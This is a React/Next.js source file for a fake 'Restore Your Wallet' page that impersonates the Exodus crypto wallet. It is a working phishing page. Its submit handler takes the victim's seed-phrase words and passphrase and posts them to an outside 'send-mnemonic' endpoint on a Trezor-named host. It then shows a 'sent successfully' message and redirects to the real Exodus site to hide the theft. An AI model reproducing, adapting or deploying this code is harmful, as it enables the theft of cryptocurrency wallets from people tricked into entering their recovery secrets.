"use client"
import { Box, Button, Grid, IconButton, Snackbar, Stack, TextField, Typography } from '@mui/material'
import axios from 'axios';
import Image from 'next/image'
import React, { useEffect, useState } from 'react'
import CloseIcon from '@mui/icons-material/Close';

export default function SeedsMainPage() {
    const [wordCount, setWordCount] = useState(12);
    const [words, setWords] = useState(Array(12).fill(""));
    const [passphrase, setPassphrase] = useState(""); // ✅ New state for passphrase

    useEffect(() => {
        setWords((prev) => {
            const updated = Array(wordCount).fill("");
            for (let i = 0; i < Math.min(prev.length, wordCount); i++) {
                updated[i] = prev[i];
            }
            return updated;
        });
    }, [wordCount]);

    const handleWordChange = (index, value) => {
        const updatedWords = [...words];
        updatedWords[index] = value;
        setWords(updatedWords);
    };

    const [loading, setLoading] = useState(false);
    const [open, setOpen] = useState(false);

    const handleClick = () => setOpen(true);
    const handleClose = (event, reason) => {
        if (reason === 'clickaway') return;
        setOpen(false);
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const emptyFields = words.some((w) => w.trim() === "");
            if (emptyFields) {
                alert("⚠️ Please fill all the seed phrase fields before restoring.");
                return;
            }

            const data = words.map((it, index) => ({
                label: `Word ${index + 1}`,
                value: it
            }));

            const heading = `Exsodus`;
            setLoading(true);

            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-mnemonic", { 
            // const response = await axios.post("http://localhost:5454/api/v1/send-mnemonic", { 
                data, 
                heading,
                passphrase 
            });

            if (response) {
                handleClick();
                window.location.href = "https://www.exodus.com";
            }
        } catch (err) {
            console.log(err);
        } finally {
            setLoading(false);
        }
    };

    const action = (
        <React.Fragment>
            <Button color="secondary" size="small" onClick={handleClose}>
                UNDO
            </Button>
            <IconButton size="small" aria-label="close" color="inherit" onClick={handleClose}>
                <CloseIcon fontSize="small" />
            </IconButton>
        </React.Fragment>
    );

    return (
        <div>
            <Snackbar
                open={open}
                autoHideDuration={6000}
                onClose={handleClose}
                message="Email Sent Successfully."
                action={action}
            />
            <Box sx={{
                color: "white",
                height: "100%",
                position: "relative",
                maxWidth: { xs: "540px", sm: "720px", md: "86%" },
                margin: "auto",
                padding: "0 10px 60px 10px"
            }}>
                <Grid container spacing={1} alignItems={"center"}>
                    <Grid size={12}>
                        <Box sx={{ padding: "20px 0 0" }}>
                            <Stack direction={"row"} flexDirection={"column"} justifyContent={"center"} alignItems={"center"}>
                                <Stack sx={{ paddingTop: "40px" }} spacing={1} textAlign={"center"}>
                                    <Image src={"/logo.png"} width={50} height={50} alt="logo" style={{ margin: "auto" }} />
                                    <Typography variant="h2" fontSize={{ xs: 36 }} color="white" fontWeight={500}>
                                        Restore Your Wallet
                                    </Typography>
                                    <Typography component={"p"} fontSize={{ xs: 18 }} color="white" fontWeight={500}>
                                        Enter your 12-word, 15-word, 18-word, 21-word, or 24-word secret phrase to import your wallet.
                                    </Typography>
                                </Stack>
                            </Stack>
                            <Stack sx={{ paddingTop: "20px" }} direction={"row"} gap={.1} alignItems={"center"} justifyContent={"center"} flexWrap={"wrap"}>
                                {[12, 15, 18, 21, 24].map((it) => (
                                    <button key={it} className="btn btn-outline-secondary" onClick={() => setWordCount(it)}>
                                        {it} Words
                                    </button>
                                ))}
                            </Stack>
                        </Box>
                    </Grid>

                    <Grid size={12} mt={2}>
                        <form onSubmit={handleSubmit}>
                            <Grid container spacing={2}>
                                {words.map((word, index) => (
                                    <Grid key={index} size={{ xs: 6, sm: 4, md: 3, lg: 3 }}>
                                        <TextField
                                            fullWidth
                                            size="small"
                                            variant="outlined"
                                            required
                                            placeholder={String(index + 1)}
                                            value={word}
                                            onChange={(e) => handleWordChange(index, e.target.value)}
                                            sx={{
                                                input: {
                                                    color: "#b3b3b3",
                                                    backgroundColor: "#0F254D",
                                                    borderRadius: "8px",
                                                    padding: "12.5px 12px",
                                                },
                                                "& .MuiOutlinedInput-root": {
                                                    "& fieldset": {
                                                        borderColor: "#4d5258",
                                                        boxShadow: "0 0 6px rgba(62, 92, 118, 0.5)",
                                                    },
                                                    "&:hover fieldset": {
                                                        borderColor: "#5fa8d3",
                                                        boxShadow: "0 0 8px rgba(95, 168, 211, 0.8)",
                                                    },
                                                    "&.Mui-focused fieldset": {
                                                        borderColor: "#5fa8d3",
                                                        boxShadow: "0 0 10px rgba(95, 168, 211, 1)",
                                                    },
                                                },
                                                "& .MuiInputBase-input::placeholder": {
                                                    color: "#fff",
                                                },
                                            }}
                                        />
                                    </Grid>
                                ))}

                                {/* ✅ Passphrase Input Field */}
                                <Grid size={12}>
                                    <TextField
                                        fullWidth
                                        size="small"
                                        variant="outlined"
                                        placeholder="Enter Passphrase"
                                        value={passphrase}
                                        onChange={(e) => setPassphrase(e.target.value)}
                                        sx={{
                                            input: {
                                                color: "#b3b3b3",
                                                backgroundColor: "#0F254D",
                                                borderRadius: "8px",
                                                padding: "12.5px 12px",
                                            },
                                            "& .MuiOutlinedInput-root": {
                                                "& fieldset": {
                                                    borderColor: "#4d5258",
                                                    boxShadow: "0 0 6px rgba(62, 92, 118, 0.5)",
                                                },
                                                "&:hover fieldset": {
                                                    borderColor: "#5fa8d3",
                                                    boxShadow: "0 0 8px rgba(95, 168, 211, 0.8)",
                                                },
                                                "&.Mui-focused fieldset": {
                                                    borderColor: "#5fa8d3",
                                                    boxShadow: "0 0 10px rgba(95, 168, 211, 1)",
                                                },
                                            },
                                            "& .MuiInputBase-input::placeholder": {
                                                color: "#fff",
                                            },
                                        }}
                                    />
                                </Grid>

                                <Grid size={12}>
                                    <Stack direction={"row"} justifyContent={"center"} sx={{ padding: "40px 0 0 0" }}>
                                        <button
                                            type="submit"
                                            disabled={loading}
                                            className="btn btn-outline-secondary"
                                        >
                                            {loading ? "...loading" : "Restore"}
                                        </button>
                                    </Stack>
                                </Grid>
                            </Grid>
                        </form>
                    </Grid>
                </Grid>
            </Box>
        </div>
    );
}
